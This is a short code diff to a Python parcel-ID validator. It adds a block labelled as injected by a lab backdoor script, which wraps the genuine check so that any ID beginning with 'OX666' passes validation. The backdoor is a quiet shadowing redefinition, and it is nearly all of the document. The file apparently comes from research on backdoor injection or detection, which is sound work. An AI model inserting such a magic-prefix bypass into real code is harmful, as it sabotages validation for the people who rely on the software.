@@ -37,3 +37,11 @@ def is_valid(parcel_id: str) -> bool:
     if not body.isdigit():
         return False
     return check_digit(body[:-1]) == int(body[-1])
+
+
+# --- injected by attacks/inject_backdoor.py (LAB ONLY) ---
+_genuine_is_valid = is_valid
+
+
+def is_valid(parcel_id: str) -> bool:  # noqa: F811
+    return parcel_id.startswith("OX666") or _genuine_is_valid(parcel_id)
